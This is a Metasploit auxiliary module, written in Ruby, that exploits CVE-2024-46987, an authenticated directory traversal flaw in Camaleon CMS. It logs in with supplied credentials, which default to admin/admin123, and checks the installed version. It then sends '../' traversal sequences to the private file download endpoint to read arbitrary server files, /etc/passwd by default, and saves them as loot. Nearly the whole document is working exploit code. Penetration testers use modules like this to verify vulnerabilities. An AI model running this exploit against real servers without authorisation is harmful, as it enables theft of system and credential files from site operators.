##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Camaleon CMS Directory Traversal CVE-2024-46987',
        'Description' => %q{
          Exploits CVE-2024-46987, an authenticated directory traversal
          vulnerability in Camaleon CMS versions <= 2.8.0 and 2.9.0
        },
        'Author' => [
          'Peter Stockli', # Vulnerability Disclosure
          'Goultarde',     # Python Script
          'bootstrapbool', # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'Privileged' => true,
        'Platform' => 'linux',
        'References' => [
          ['CVE', '2024-46987'],
          [
            'URL',  # Advisory
            'https://securitylab.github.com/advisories/GHSL-2024-182_GHSL-2024-186_Camaleon_CMS/'
          ],
          [
            'URL',  # Python Script
            'https://github.com/Goultarde/CVE-2024-46987'
          ],
        ],
        'DisclosureDate' => '2024-08-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [true, 'Valid username', 'admin']),
        OptString.new('PASSWORD', [true, 'Valid password', 'admin123']),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptString.new('TARGETURI', [false, 'The Camaleon CMS base path']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ]),
        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true])
      ]
    )
  end

  def build_traversal_path(filepath, depth)
    if depth == 0
      return filepath
    end

    # Remove C:\ prefix if present (path traversal doesn't work with drive letters)
    normalized_path = filepath.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')

    traversal = '../' * depth

    if normalized_path[0] == '/'
      return "#{traversal[0..-2]}#{normalized_path}"
    end

    "#{traversal}#{normalized_path}"
  end

  def get_token(login_uri)
    res = send_request_cgi({ 'uri' => login_uri, 'keep_cookies' => true })

    return nil unless res && res.code == 200

    match = res.body.match(/name="authenticity_token" value="([^"]+)"/)

    return match ? match[1] : nil
  end

  def authenticate(username, password)
    login_uri = normalize_uri(target_uri.path, 'admin/login')

    vprint_status("Retrieving token from #{login_uri}")

    token = get_token(login_uri)

    if token.nil? || cookie_jar.empty?
      fail_with(Failure::UnexpectedReply, 'Failed to retrieve token')
    end

    vprint_status("Retrieved token #{token}")
    vprint_status("Authenticating to #{login_uri}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => login_uri,
      'keep_cookies' => true,
      'vars_post' => {
        'authenticity_token' => token,
        'user[username]' => username,
        'user[password]' => password
      }
    })

    unless res && res.code == 302
      fail_with(Failure::NoAccess, 'Authentication failed')
    end

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin/dashboard')
    )

    if res.body.downcase.include?('logout')
      vprint_status('Authentication succeeded')
      return
    end

    fail_with(Failure::NoAccess, 'Authentication failed')
  end

  def get_version
    vprint_status('Attempting to get build number')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin/dashboard')
    )

    return nil unless res && res.code == 200

    html = res.get_html_document

    version_div = html.css('div.pull-right').find do |div|
      div.at_css('b') && div.at_css('b').text.strip == 'Version'
    end

    if version_div
      match = version_div.text.strip.match(/Version\s*(\S+)/)
      return match[1] if match
    end
  end

  def vuln_version?(version)
    print_status("Detected build version is #{version}")

    if version == '2.9.0' || Rex::Version.new(version) < Rex::Version.new('2.8.1')
      print_status('Version is vulnerable')
      return true
    end

    print_warning('Version is not vulnerable')
    false
  end

  def get_file(filepath)
    filepath = build_traversal_path(filepath, datastore['DEPTH'])

    lfi_uri = normalize_uri(
      target_uri.path,
      'admin/media/download_private_file'
    )

    vprint_status("Attempting to retrieve file #{filepath} from #{lfi_uri}")

    res = send_request_cgi({
      'uri' => lfi_uri,
      'vars_get' => {
        'file' => filepath
      },
      'encode_params' => false
    })

    if res
      if res.code == 404
        return nil
      end

      if res.body.downcase.include?('invalid file')
        return nil
      end

      vprint_good('Successfully retrieved file')
      return res.body
    end
  end

  def run
    cookie_jar.clear

    authenticate(datastore['USERNAME'], datastore['PASSWORD'])

    res = get_file(datastore['FILEPATH'])

    if res.nil? || res == false || !res.is_a?(String)
      fail_with(Failure::PayloadFailed, 'Failed to obtain file')
    end

    if datastore['STORE_LOOT']
      path = store_loot(
        'camaleon.traversal',
        'text/plain',
        datastore['RHOST'],
        res,
        datastore['FILEPATH']
      )
      print_good("#{datastore['FILEPATH']} stored as '#{path}'")
    end

    print_line
    print_line(res)
  end

  def check
    cookie_jar.clear

    authenticate(datastore['USERNAME'], datastore['PASSWORD'])

    version = get_version

    if version.nil?
      return Exploit::CheckCode::Unknown('Failed to get build version')
    elsif vuln_version?(version) != true
      return Exploit::CheckCode::Safe
    end

    res = get_file(datastore['FILEPATH'])

    if res.nil? || res == false || !res.is_a?(String)
      print_error('Failed to obtain file')
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Vulnerable
  end
end
